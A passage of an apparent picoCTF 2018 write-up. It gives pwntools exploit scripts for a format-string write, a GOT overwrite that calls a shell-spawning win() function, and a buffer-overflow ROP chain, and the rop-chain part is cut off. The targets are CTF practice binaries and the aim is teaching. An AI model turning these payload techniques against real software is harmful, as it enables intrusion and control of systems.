</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> pwn
<span style="color:#6272a4">#pwn.context.log_level = &#39;critical&#39;</span>

DEV <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>

h, p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#bd93f9">43438</span>
elf <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;./auth&#39;</span>)

pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;sym.authenticate: </span><span style="color:#f1fa8c">{:02X}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;authenticated&#39;</span>]))

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_process</span>():
    <span style="color:#ff79c6">if</span> DEV:
        <span style="color:#ff79c6">return</span> elf<span style="color:#ff79c6">.</span>process()
    <span style="color:#ff79c6">else</span>:
        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>remote(h, p)


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">manual</span>():
    payload <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;authenticated&#39;</span>])
    <span style="color:#6272a4">#payload += &#39;%p&#39;*11</span>
    <span style="color:#6272a4">#payload += &#39;%11$p&#39;</span>
    payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;%11$n&#39;</span>

    s <span style="color:#ff79c6">=</span> get_process()
    prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;no)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
    s<span style="color:#ff79c6">.</span>sendline(payload)
    prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
    <span style="color:#8be9fd;font-style:italic">print</span> (prompt)
    <span style="color:#ff79c6">return</span>


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">bruteforce</span>():
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
      payload <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;authenticated&#39;</span>])
      payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;%&#39;</span><span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;$n&#39;</span>
      s <span style="color:#ff79c6">=</span> get_process()
      prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;no)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
      s<span style="color:#ff79c6">.</span>sendline(payload)
      prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
      s<span style="color:#ff79c6">.</span>close()
      <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;pico&#39;</span> <span style="color:#ff79c6">in</span> prompt:
          <span style="color:#8be9fd;font-style:italic">print</span> (<span style="color:#8be9fd;font-style:italic">str</span>(i) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39; : &#39;</span> <span style="color:#ff79c6">+</span> payload <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39; : &#39;</span> <span style="color:#ff79c6">+</span>prompt)
          <span style="color:#ff79c6">break</span>
      <span style="color:#ff79c6">return</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">the_pwn_way</span>():
    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">exec_fmt</span>(payload):
        proc <span style="color:#ff79c6">=</span> get_process()
        proc<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;(yes/no)&#34;</span>, payload)
        <span style="color:#ff79c6">return</span> proc<span style="color:#ff79c6">.</span>recvall()
    autofmt <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>FmtStr(exec_fmt)
    writes <span style="color:#ff79c6">=</span> {elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;authenticated&#39;</span>]:   <span style="color:#bd93f9">1</span>}
    payload <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>fmtstr_payload(autofmt<span style="color:#ff79c6">.</span>offset, writes)
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Payload: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(pwn<span style="color:#ff79c6">.</span>enhex(payload)))
    <span style="color:#8be9fd;font-style:italic">print</span> exec_fmt(payload)
    <span style="color:#ff79c6">return</span>


<span style="color:#6272a4">#python -c &#39;print &#34;\x4c\xa0\x04\x08%11$n&#34;&#39; | nc 2018shell.picoctf.com 43438</span>
<span style="color:#6272a4">#bruteforce()</span>
<span style="color:#6272a4">#manual();</span>
the_pwn_way()
</code></pre></td></tr></table>
</div>
</div><h2 id="got-shell">got-shell</h2>
<ul>
<li>source: <a href="./resources/got-shell/auth">auth.c</a></li>
<li>binary: <a href="./resources/got-shell/auth">auth</a></li>
</ul>
<p>Executing the win() function will give us a shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">win</span>() {
  system(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
}
</code></pre></td></tr></table>
</div>
</div><ol>
<li>The program prompt us to input two 4 bytes addresses: <strong>address</strong> and <strong>value</strong></li>
<li>Then the program will overwrite the content at <strong>address</strong> with our <strong>value</strong></li>
<li>After overwriting the address, there is two calls before the end of the program: puts and exit</li>
<li>Our strategy is to overwrite either the address of the puts() function or the exit() function with the address of win()</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>)address <span style="color:#ff79c6">=</span> value;
puts(<span style="color:#f1fa8c">&#34;Okay, exiting now...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
exit(<span style="color:#bd93f9">1</span>);
</code></pre></td></tr></table>
</div>
</div><p>exploit below:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> pwn

DEV <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>

prgm <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;./auth&#39;</span>
host, port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#bd93f9">3582</span>
elf <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(prgm)

value <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;win&#39;</span>]
address <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;puts&#39;</span>]
<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;Overwriting puts 0x</span><span style="color:#f1fa8c">{:02X}</span><span style="color:#f1fa8c"> with win 0x</span><span style="color:#f1fa8c">{:02X}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(address, value)

<span style="color:#ff79c6">if</span> DEV:
    s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>process(prgm)
<span style="color:#ff79c6">else</span>:
    s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>remote(host, port)

s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;value?&#39;</span>)
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">hex</span>(address))
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">hex</span>(value))
prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
<span style="color:#8be9fd;font-style:italic">print</span> prompt

s<span style="color:#ff79c6">.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id="rop-chain">rop-chain</h2>
<ul>
<li>source: <a href="./resources/rop-chain/rop.c">rop.c</a></li>
<li>binary: <a href="./resources/rop-chain/rop">rop</a></li>
<li><a href="http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html">codearcana</a> is a great resource to learn rop chain</li>
</ul>
<p>This code has a vuln() function which has a char buf[16] buffer vulnerable to overflow.</p>
<p>The stack of the vuln function before exploitation:</p>
<pre><code>+---------------+
|   RET TO MAIN	|	EBP+4
+---------------+
|    OLD EBP	| &lt;-- 	EBP
+---------------+
|    ????       |
+---------------+
|               |
|    buf[16]	|
|               |	EBP-0x18 (offset=24 is obtained with radare)
+---------------+
</code></pre>
<p>As per the below code, there is a certain sequence of function calls needed to exploit this overflow and print the flag.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">bool</span> win1 <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">false</span>;
<span style="color:#8be9fd">bool</span> win2 <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">false</span>;

<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">win_function1</span>() {
  win1 <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">true</span>;
}

<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">win_function2</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> arg_check1) {
  <span style="color:#ff79c6">if</span> (win1 <span style="color:#ff79c6">&amp;&amp;</span> arg_check1 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0xBAAAAAAD</span>) {
    win2 <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">true</span>;
  }
  [...]
}

<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">flag</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> arg_check2) {
  [...]
  <span style="color:#ff79c6">if</span> (win1 <span style="color:#ff79c6">&amp;&amp;</span> win2 <span style="color:#ff79c6">&amp;&amp;</span> arg_check2 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0xDEADBAAD</span>) {
    printf(<span style="color:#f1fa8c">&#34;%s&#34;</span>, flag);
    <span style="color:#ff79c6">return</span>;
  }
}
</code></pre></td></tr></table>
</div>
</div><p>We can use a ROP chain with the below sequence:</p>
<ol>
<li>First we need to call the win_function1() to set the boolean win1 to true</li>
<li>Then we need to call win_function2(0xBAAAAAAD) to set boolean win2 to true</li>
<li>Then we need to call flag(0xDEADBAAD)</li>
</ol>
<p>The stack after the Rop chain will looks like:</p>
<pre><code>+---------------+
| 0xDEADBAAD	|	ROP+0x18 (arg for flag function)
+---------------+
|     JUNK      |	ROP+0x14 junk return address
+---------------+
|     flag      |	ROP+0x10
+---------------+
| 0xBAAAAAAD	|	ROP+0xC	(arg for win_function2)
+---------------+
|&amp;(pop ebx; ret)|	ROP+0x8 (address of pop ebx; ret) obtained with objdump
+---------------+
| win_function2	|	ROP+0x4
+---------------+
| win_function1	|	EBP+4 = ROP start
+---------------+
|     AAAA      | &lt;-- 	EBP
+---------------+
|     AAAA      |
+---------------+
|     AAAA      |
|     AAAA      |
|     AAAA      |
|     AAAA      |	EBP-0x18 (offset=24 is obtained with radare)
+---------------+
</code></pre>
<p>To find the address of the gadget <code>pop ebp; ret</code>, we can use <code>objdump -d &lt;binary_name&gt;</code> :</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
804840d:	5b                   	pop    %ebx
804840e:	c3                   	ret
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
8048806:	5b                   	pop    %ebx
8048807:	c3                   	ret
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>Our payload looks like that:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./rop&#39;</span>)
payload <span style="color:#ff79c6">=</span> p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;win_function1&#39;</span>])
payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;win_function2&#39;</span>])
payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0x804840d</span>)   <span style="color:#6272a4">#address of pop ebx; ret</span>
payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0xBAAAAAAD</span>)
payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;flag&#39;</span>])
payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;JUNK&#39;</span>
payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0xDEADBAAD</span>)
</code></pre></td></tr></table>
</div>
</div><p>pwntools has a ROP object which simplify by finding and adding automatically gadgets we need.
Also syntax for building the rop chain is much more straight forward and readable:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./rop&#39;</span>)
rop_chain <span style="color:#ff79c6">=</span> ROP(elf)
rop_chain<span style="color:#ff79c6">.</span>win_function1()
rop_chain<span style="color:#ff79c6">.</span>win_function2(<span style="color:#bd93f9">0xBAAAAAAD</span>)
